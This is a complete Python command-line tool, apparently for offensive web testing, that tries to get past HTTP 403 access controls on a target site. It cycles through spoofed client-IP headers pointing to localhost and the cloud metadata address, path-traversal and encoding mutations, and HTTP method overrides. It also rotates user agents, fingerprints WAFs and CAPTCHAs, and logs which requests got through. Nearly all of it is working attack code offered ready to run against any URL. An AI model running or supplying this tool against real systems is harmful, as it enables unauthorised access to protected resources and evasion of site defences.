#!/usr/bin/env python3
import requests
import argparse
import random
import json
import sys
import time
import re
import platform
import socket
from urllib.parse import urljoin, urlparse
from colorama import init, Fore, Style, Back
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from threading import Event

init(autoreset=True)

VERSION = "1.0.1"

# Expanded list of user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
]

# Expanded HTTP methods
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]

# Enhanced bypass headers
HEADERS_BYPASS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "169.254.169.254"},
    {"X-Forwarded-For": "2130706433"}, # Decimal representation of 127.0.0.1
    {"X-Forwarded-Host": "localhost"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Referrer": "https://www.google.com"},
    {"Referer": "https://www.google.com"},
    {"Origin": "https://www.google.com"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"X-WAF-Bypass": "1"},
    {"Content-Security-Policy-Report-Only": "*"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Bypass-403": "1"},
    {"X-Authorization": "Bearer {random}"},
    {"X-Requested-With": "XMLHttpRequest"},
]

# Enhanced path mutations
PATH_MUTATIONS = [
    "{path}",
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "{path}/../",
    "{path}%20",
    "{path}%09",
    "{path}?",
    "{path}??",
    "{path}?&",
    "{path}#",
    "{path}%23",
    "{path}%2e",
    "{path}.html",
    "{path}.php",
    "{path}.json",
    "{path}.xml",
    "{path}.aspx",
    "{path}.asp",
    "{path}.jsp",
    "{path};",
    "{path};/",
    "{path};a=1",
    "/%2e/{path}",
    "..;/{path}",
    "/.../{path}",
    "/..%2f{path}",
    "/..%252f{path}",
    "/./{path}",
    "//{path}",
    "{path}?random={random}",
    "{path}#bypass",
    "../{path}",
    "../../{path}",
    "{path}/.json",
    "{path}?debug=true",
    "{path}?test=true",
    "{path}?oauth=true",
    "{path}.bak",
    "{path}.old",
    "{path}.original",
    "{path}.txt",
    "{path}.html.bak",
    "{path}%2f.%2f",
    "{path}%252e%252e%252f",
    "{path}/..%2f..%2f",
    "{path}//..%2f",
    "{path}/%2f%2e%2e/",
    "/api/{path}",
    "/public{path}",
    "/v1{path}",
    "/v2{path}",
    "/v3{path}",
    "/api/v1{path}",
    "/api/v2{path}",
]

# WAF and service signatures
WAF_SIGNATURES = {
    "Cloudflare": [
        "cloudflare", 
        "cf-ray", 
        "cf-chl-bypass", 
        "__cfduid", 
        "cf-request-id",
        "_cf_bm"
    ],
    "AWS WAF": [
        "aws-waf-token", 
        "x-amzn-requestid", 
        "x-amz-cf-id",
        "x-amz-cf-pop"
    ],
    "Akamai": [
        "akamai", 
        "akamaighost", 
        "akamaicdn",
        "aka-debug",
        "x-akamai-transformed"
    ],
    "Imperva/Incapsula": [
        "incapsula", 
        "visid_incap", 
        "_incapsula_",
        "incap_ses"
    ],
    "Sucuri": [
        "sucuri", 
        "x-sucuri",
        "x-sucuri-id",
        "x-sucuri-cache"
    ],
    "ModSecurity": [
        "modsecurity", 
        "mod_security", 
        "was blocked",
        "blocked by mod_security"
    ],
    "F5 BIG-IP ASM": [
        "bigip", 
        "ts", 
        "f5apm"
    ],
    "Barracuda": [
        "barracuda", 
        "barra_counter"
    ],
    "Fastly": [
        "fastly", 
        "x-fastly",
        "x-served-by",
        "x-cache"
    ],
    "Varnish": [
        "varnish",
        "x-varnish",
        "via: varnish"
    ],
    "Nginx": [
        "nginx",
        "server: nginx"
    ],
    "Apache": [
        "apache",
        "server: apache"
    ],
    "IIS": [
        "iis",
        "server: microsoft-iis"
    ],
    "DDoS-Guard": [
        "ddos-guard",
        "__ddg"
    ],
    "Wordfence": [
        "wordfence",
        "wfCBL"
    ],
    "Radware": [
        "radware",
        "x-sl-compstate"
    ],
    "Fortinet/FortiWeb": [
        "fortinet",
        "fortiweb",
        "fortigate",
        "fortiwebid"
    ],
    "MercadoLibre WAF": [
        "mercadolibre",
        "meli",
        "ml-waf"
    ]
}

# CAPTCHA signatures
CAPTCHA_SIGNATURES = {
    "reCAPTCHA": [
        "recaptcha", 
        "g-recaptcha",
        "grecaptcha"
    ],
    "hCaptcha": [
        "hcaptcha", 
        "h-captcha"
    ],
    "Cloudflare Turnstile": [
        "turnstile", 
        "cf-turnstile",
        "cf_challenge"
    ],
    "Arkose Labs": [
        "arkoselabs", 
        "funcaptcha"
    ],
    "Generic CAPTCHA": [
        "captcha", 
        "human-verification",
        "are you human",
        "bot-detection",
        "challenge"
    ]
}

class BypassBlaster:
    def __init__(self, url, path="/", proxies=None, threads=5, timeout=10, delay=0, 
                 verbose=False, retry=2, cookie=None, follow_redirects=False,
                 custom_headers=None, custom_payloads=None, max_requests=None, 
                 burst_mode=False, verify_ssl=True, stop_on_success=False):
        # Make sure URL has scheme
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            print(f"{Fore.YELLOW}[!] No URL scheme provided. Using https://{Style.RESET_ALL}")
            
        self.url = url.rstrip("/")
        self.path = path if path.startswith("/") else f"/{path}"
        self.proxies = proxies if proxies else {}
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.retry = retry
        self.cookie = cookie
        self.follow_redirects = follow_redirects
        self.custom_headers = custom_headers or {}
        self.custom_payloads = custom_payloads or []
        self.max_requests = max_requests
        self.burst_mode = burst_mode
        self.verify_ssl = verify_ssl
        self.stop_on_success = stop_on_success
        
        self.results = []
        self.successful_bypasses = []
        self.waf_detected = set()
        self.captcha_detected = False
        self.captcha_types = set()
        self.start_time = None
        self.end_time = None
        self.request_count = 0
        self.success_count = 0
        self.session = requests.Session()

    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}██████╗ {Fore.LIGHTBLUE_EX}██╗   ██╗{Fore.BLUE}██████╗  {Fore.LIGHTBLUE_EX}█████╗ {Fore.BLUE}███████╗███████╗{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}██╔══██╗{Fore.LIGHTBLUE_EX}╚██╗ ██╔╝{Fore.BLUE}██╔══██╗{Fore.LIGHTBLUE_EX}██╔══██╗{Fore.BLUE}██╔════╝██╔════╝{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}██████╔╝{Fore.LIGHTBLUE_EX} ╚████╔╝ {Fore.BLUE}██████╔╝{Fore.LIGHTBLUE_EX}███████║{Fore.BLUE}███████╗███████╗{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}██╔══██╗{Fore.LIGHTBLUE_EX}  ╚██╔╝  {Fore.BLUE}██╔═══╝ {Fore.LIGHTBLUE_EX}██╔══██║{Fore.BLUE}╚════██║╚════██║{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}██████╔╝{Fore.LIGHTBLUE_EX}   ██║   {Fore.BLUE}██║     {Fore.LIGHTBLUE_EX}██║  ██║{Fore.BLUE}███████║███████║{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.BLUE}║ {Fore.BLUE}╚═════╝ {Fore.LIGHTBLUE_EX}   ╚═╝   {Fore.BLUE}╚═╝     {Fore.LIGHTBLUE_EX}╚═╝  ╚═╝{Fore.BLUE}╚══════╝╚══════╝{Fore.BLUE} ║{Style.RESET_ALL}
{Fore.CYAN}║────────────────────────────────────────────────────────────{Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║ {Fore.BLUE}        BypassNinja {VERSION} - HTTP 403 Evasion Tool         {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}║ {Fore.LIGHTBLUE_EX}                      by @M4rt1n_0x1337                       {Fore.CYAN}║{Style.RESET_ALL}
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def print_target_info(self):
        parsed_url = urlparse(self.url)
        try:
            ip = socket.gethostbyname(parsed_url.netloc)
        except:
            ip = "Unable to resolve"
        
        print(f"{Fore.CYAN}[Target Information]{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}URL:{Style.RESET_ALL} {self.url}{self.path}")
        print(f"  {Fore.WHITE}Host:{Style.RESET_ALL} {parsed_url.netloc}")
        print(f"  {Fore.WHITE}IP:{Style.RESET_ALL} {ip}")
        print(f"  {Fore.WHITE}Protocol:{Style.RESET_ALL} {parsed_url.scheme}")
        print(f"  {Fore.WHITE}Threads:{Style.RESET_ALL} {self.threads}")
        print(f"  {Fore.WHITE}Proxy:{Style.RESET_ALL} {self.proxies.get('http', 'None')}")
        print(f"  {Fore.WHITE}SSL Verification:{Style.RESET_ALL} {'Enabled' if self.verify_ssl else 'Disabled'}")
        print(f"  {Fore.WHITE}Start Time:{Style.RESET_ALL} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)
        
    def mutate_path(self, path):
        random_str = str(random.randint(1000, 9999))
        mutations = [mutation.format(path=path, random=random_str) for mutation in PATH_MUTATIONS]
        
        # Add custom payloads if provided
        if self.custom_payloads:
            for payload in self.custom_payloads:
                mutations.append(payload.format(path=path, random=random_str))
                
        return mutations

    def detect_waf(self, response):
        detected_wafs = []
        
        # Check headers for WAF signatures
        headers_str = str(response.headers).lower()
        content = response.text.lower()
        
        for waf_name, signatures in WAF_SIGNATURES.items():
            for signature in signatures:
                if signature.lower() in headers_str or signature.lower() in content:
                    detected_wafs.append(waf_name)
                    self.waf_detected.add(waf_name)
                    break
                    
        return detected_wafs
        
    def detect_captcha(self, response):
        content = response.text.lower()
        detected_captcha = []
        
        for captcha_type, signatures in CAPTCHA_SIGNATURES.items():
            for signature in signatures:
                if signature.lower() in content:
                    detected_captcha.append(captcha_type)
                    self.captcha_detected = True
                    self.captcha_types.add(captcha_type)
                    break
                    
        return detected_captcha

    def check_response(self, response):
        status = response.status_code
        size = len(response.content)
        wafs = self.detect_waf(response)
        captchas = self.detect_captcha(response)
        
        if status in [200, 201]:
            return True, f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}", size, wafs, captchas
        elif status in [301, 302, 307, 308]:
            return False, f"{Fore.BLUE}REDIRECT{Style.RESET_ALL}", size, wafs, captchas
        elif status in [401, 403]:
            return False, f"{Fore.RED}BLOCKED{Style.RESET_ALL}", size, wafs, captchas
        elif status == 429:
            return False, f"{Fore.MAGENTA}RATE LIMITED{Style.RESET_ALL}", size, wafs, captchas
        elif status == 503:
            return False, f"{Fore.YELLOW}SERVICE UNAVAILABLE{Style.RESET_ALL}", size, wafs, captchas
        else:
            return False, f"{Fore.YELLOW}OTHER ({status}){Style.RESET_ALL}", size, wafs, captchas

    def try_request(self, method, url, headers=None, retry_count=0, stop_event=None):
        if self.max_requests is not None and self.request_count >= self.max_requests:
            return None
        
        # Verificar si se debe detener antes de hacer la solicitud
        if stop_event and stop_event.is_set():
            return None  # Salir si se ha activado el evento de parada

        try:
            headers = headers or {}
            headers["User-Agent"] = self.get_random_user_agent()
            if self.custom_headers:
                headers.update(self.custom_headers)
            cookies = {}
            if self.cookie:
                for cookie_pair in self.cookie.split(';'):
                    if '=' in cookie_pair:
                        key, value = cookie_pair.strip().split('=', 1)
                        cookies[key] = value
            
            self.request_count += 1
            
            if self.delay > 0 and not self.burst_mode:
                time.sleep(self.delay)
                
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                proxies=self.proxies,
                timeout=self.timeout,
                allow_redirects=self.follow_redirects,
                cookies=cookies if cookies else None,
                verify=self.verify_ssl
            )
            
            success, status_text, size, detected_wafs, detected_captchas = self.check_response(response)
            
            # Detener si se encuentra un código de éxito o redirección
            if response.status_code in [200, 301, 302, 307, 308]:
                print(f"{Fore.GREEN}[SUCCESS/REDIRECT]{Style.RESET_ALL} [{method}] {url} | Status: {status_text} {response.status_code} | Size: {size}")
                return {"success": True}  # Marcar como éxito
            
            # Procesar el resultado si no es un éxito o redirección
            result = {
                "method": method,
                "url": url,
                "headers": headers,
                "status": response.status_code,
                "size": size,
                "success": success,
                "waf": detected_wafs,
                "captcha": detected_captchas,
                "response_headers": dict(response.headers),
                "content_preview": response.text[:200] if success else ""
            }
            
            if success:
                self.success_count += 1
                self.successful_bypasses.append(result)
                print(f"{Fore.GREEN}[HIT]{Style.RESET_ALL} [{method}] {url} | Status: {status_text} {response.status_code} | Size: {size}")
            elif self.verbose:
                print(f"[{method}] {url} | Status: {status_text} {response.status_code} | Size: {size}")
            
            return result
            
        except requests.exceptions.SSLError as e:
            if self.verify_ssl:
                print(f"{Fore.YELLOW}[SSL ERROR]{Style.RESET_ALL} {method} {url} - {str(e)}")
                print(f"{Fore.YELLOW}[TIP]{Style.RESET_ALL} Try running with --no-verify to disable SSL verification")
            return None
        except requests.RequestException as e:
            if retry_count < self.retry:
                if self.verbose:
                    print(f"{Fore.YELLOW}[RETRY]{Style.RESET_ALL} {method} {url} - {str(e)}")
                return self.try_request(method, url, headers, retry_count + 1, stop_event)
            else:
                if self.verbose:
                    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {method} {url} - {str(e)}")
                return None
        finally:
            if stop_event and stop_event.is_set():
                print(f"{Fore.YELLOW}[!] Detenido por éxito.{Style.RESET_ALL}")
                return None  # Salir si se ha activado el evento de parada

    def run(self):
        self.print_banner()
        self.print_target_info()
        
        print(f"{Fore.CYAN}=== Starting bypass attempts on {self.url}{self.path} ==={Style.RESET_ALL}")
        
        self.start_time = time.time()
        mutated_paths = self.mutate_path(self.path)
        
        # Initial probe to detect WAF and baseline
        print(f"{Fore.YELLOW}[+] Performing initial probe to detect WAF...{Style.RESET_ALL}")
        try:
            probe_response = self.session.get(
                urljoin(self.url, self.path),
                headers={"User-Agent": self.get_random_user_agent()},
                proxies=self.proxies,
                timeout=self.timeout,
                allow_redirects=False,
                verify=self.verify_ssl
            )
            
            # Check if we've got a redirect response that might be affecting our path construction
            if probe_response.status_code in [301, 302, 307, 308] and 'Location' in probe_response.headers:
                redirect_url = probe_response.headers['Location']
                print(f"{Fore.YELLOW}[!] Redirect detected: {redirect_url}{Style.RESET_ALL}")
            
            wafs = self.detect_waf(probe_response)
            if wafs:
                print(f"{Fore.YELLOW}[!] Detected WAF/Security Service: {', '.join(wafs)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] No WAF detected or WAF signature unknown{Style.RESET_ALL}")
                
            print(f"{Fore.CYAN}[+] Baseline response: Status {probe_response.status_code}, Size {len(probe_response.content)}{Style.RESET_ALL}")
            print()
        except requests.exceptions.SSLError as e:
            print(f"{Fore.RED}[!] SSL Error during initial probe: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[TIP]{Style.RESET_ALL} Try running with --no-verify to disable SSL verification")
            print()
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to perform initial probe: {str(e)}{Style.RESET_ALL}")
            print()

        total_combinations = len(mutated_paths) * len(HTTP_METHODS) * (len(HEADERS_BYPASS) + 1)
        if self.max_requests is not None:
            total_combinations = min(total_combinations, self.max_requests)
            
        print(f"{Fore.CYAN}[+] Starting bypass attempts with up to {total_combinations} combinations...{Style.RESET_ALL}")

        methods_to_try = HTTP_METHODS
        if self.burst_mode:
            methods_to_try = ["GET", "POST"]
        
        test_cases = []
        for method in methods_to_try:
            for path in mutated_paths:
                full_url = urljoin(self.url, path)
                test_cases.append((method, full_url, None))
                for header_template in HEADERS_BYPASS:
                    headers = {k: v.format(path=self.path, random=str(random.randint(1000, 9999))) 
                              if "{path}" in v or "{random}" in v else v 
                              for k, v in header_template.items()}
                    test_cases.append((method, full_url, headers))
        
        if self.max_requests is not None:
            random.shuffle(test_cases)
            test_cases = test_cases[:self.max_requests]
        
        stop_event = Event()  # Evento para controlar la detención
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # Generar y enviar tareas al ejecutor
            for method, url, headers in test_cases:
                if stop_event.is_set():
                    break  # No enviar más tareas
                future = executor.submit(self.try_request, method, url, headers, stop_event)
                futures.append(future)
            
            # Procesar resultados
            for future in futures:
                result = future.result()
                if result and result.get("success"):
                    if self.stop_on_success:
                        stop_event.set()  # Activar el evento de parada
                        break  # Salir del bucle de procesamiento

        self.end_time = time.time()
        self.print_summary()

    def print_summary(self):
        elapsed_time = self.end_time - self.start_time
        
        print(f"\n{Fore.CYAN}=== BypassBlaster Summary ==={Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Target:{Style.RESET_ALL} {self.url}{self.path}")
        print(f"  {Fore.WHITE}Requests:{Style.RESET_ALL} {self.request_count}")
        print(f"  {Fore.WHITE}Successful Bypasses:{Style.RESET_ALL} {self.success_count}")
        print(f"  {Fore.WHITE}Time Elapsed:{Style.RESET_ALL} {elapsed_time:.2f} seconds")
        print(f"  {Fore.WHITE}Requests/sec:{Style.RESET_ALL} {self.request_count / elapsed_time:.2f}")
        
        if self.waf_detected:
            print(f"  {Fore.WHITE}WAF/Security Services Detected:{Style.RESET_ALL} {', '.join(self.waf_detected)}")
        else:
            print(f"  {Fore.WHITE}WAF/Security Services:{Style.RESET_ALL} None detected")
            
        if self.captcha_detected:
            print(f"  {Fore.WHITE}CAPTCHA Types Detected:{Style.RESET_ALL} {', '.join(self.captcha_types)}")
        
        if self.successful_bypasses:
            print(f"\n{Fore.GREEN}=== Successful Bypasses ==={Style.RESET_ALL}")
            for i, bypass in enumerate(self.successful_bypasses[:10], 1):
                print(f"  {i}. [{bypass['method']}] {bypass['url']}")
                print(f"     Status: {bypass['status']}, Size: {bypass['size']}")
                if bypass['waf']:
                    print(f"     WAF: {', '.join(bypass['waf'])}")
                    
            if len(self.successful_bypasses) > 10:
                print(f"  ... and {len(self.successful_bypasses) - 10} more (see output file for complete results)")
        else:
            print(f"\n{Fore.RED}No successful bypasses found.{Style.RESET_ALL}")
        
        # Provide suggestions if no successful bypasses were found
        if self.success_count == 0:
            print(f"\n{Fore.YELLOW}[!] Suggestions for improving results:{Style.RESET_ALL}")
            print(f"  - Try using different HTTP headers with {Fore.CYAN}--headers{Style.RESET_ALL}")
            print(f"  - Try with cookies if authentication is required: {Fore.CYAN}--cookie{Style.RESET_ALL}")
            print(f"  - Try with SSL verification disabled: {Fore.CYAN}--no-verify{Style.RESET_ALL}")
            print(f"  - Try increasing timeout: {Fore.CYAN}--timeout 15{Style.RESET_ALL}")
            print(f"  - Try using a proxy: {Fore.CYAN}--proxy http://your-proxy:8080{Style.RESET_ALL}")
            print(f"  - Target might have IP-based restrictions that can't be bypassed")
            
        print("\nComplete results are available in the output file if specified.")

    def save_results(self, output_file):
        output = {
            "target": f"{self.url}{self.path}",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_requests": self.request_count,
                "successful_bypasses": self.success_count,
                "time_elapsed": self.end_time - self.start_time,
                "waf_detected": list(self.waf_detected),
                "captcha_detected": list(self.captcha_types) if self.captcha_detected else []
            },
            "successful_bypasses": [
                {
                    "method": bypass["method"],
                    "url": bypass["url"],
                    "status": bypass["status"],
                    "size": bypass["size"],
                    "waf": bypass["waf"],
                    "captcha": bypass["captcha"],
                    "headers": {k: v for k, v in bypass["headers"].items() if k != "User-Agent"},
                    "content_preview": bypass["content_preview"]
                } for bypass in self.successful_bypasses
            ]
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(output, f, indent=4)
            print(f"{Fore.GREEN}[+] Results saved to {output_file}{Style.RESET_ALL}")
        except Exception as e:    
            print(f"{Fore.RED}[!] Error saving results: {str(e)}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description=f"BypassBlaster v{VERSION} - HTTP 403 Evasion Tool")
    
    # Required arguments
    parser.add_argument("url", help="Target URL (e.g. https://example.com)")
    
    # Optional arguments
    parser.add_argument("-p", "--path", default="/", help="Path to test (default: /)")
    parser.add_argument("-o", "--output", help="Output file for results (JSON format)")
    parser.add_argument("--proxy", help="Proxy URL (e.g. http://127.0.0.1:8080)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output (show all attempts)")
    parser.add_argument("-r", "--retry", type=int, default=2, help="Number of retries for failed requests (default: 2)")
    parser.add_argument("-c", "--cookie", help="Cookies to include with requests (format: 'name1=value1; name2=value2')")
    parser.add_argument("--follow-redirects", action="store_true", help="Follow redirects")
    parser.add_argument("--headers", help="Custom headers in JSON format (e.g. '{\"X-Custom-Header\": \"value\"}')")
    parser.add_argument("--payloads", help="Custom path mutation payloads in JSON format")
    parser.add_argument("--max-requests", type=int, help="Maximum number of requests to make")
    parser.add_argument("--burst", action="store_true", help="Burst mode (less accurate but faster)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--stop-on-success", action="store_true", help="Stop after the first successful bypass")
    
    args = parser.parse_args()
    
    # Handle proxy
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    # Handle custom headers
    custom_headers = {}
    if args.headers:
        try:
            custom_headers = json.loads(args.headers)
        except json.JSONDecodeError:
            print(f"{Fore.RED}[!] Error parsing custom headers. Must be valid JSON.{Style.RESET_ALL}")
            sys.exit(1)
    
    # Handle custom payloads
    custom_payloads = []
    if args.payloads:
        try:
            custom_payloads = json.loads(args.payloads)
            if not isinstance(custom_payloads, list):
                print(f"{Fore.RED}[!] Custom payloads must be a JSON array.{Style.RESET_ALL}")
                sys.exit(1)
        except json.JSONDecodeError:
            print(f"{Fore.RED}[!] Error parsing custom payloads. Must be valid JSON.{Style.RESET_ALL}")
            sys.exit(1)

    try:
        blaster = BypassBlaster(
            url=args.url,
            path=args.path,
            proxies=proxies,
            threads=args.threads,
            timeout=args.timeout,
            delay=args.delay,
            verbose=args.verbose,
            retry=args.retry,
            cookie=args.cookie,
            follow_redirects=args.follow_redirects,
            custom_headers=custom_headers,
            custom_payloads=custom_payloads,
            max_requests=args.max_requests,
            burst_mode=args.burst,
            verify_ssl=not args.no_verify,
            stop_on_success=args.stop_on_success
        )
        
        blaster.run()
        
        if args.output:
            blaster.save_results(args.output)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Execution interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
            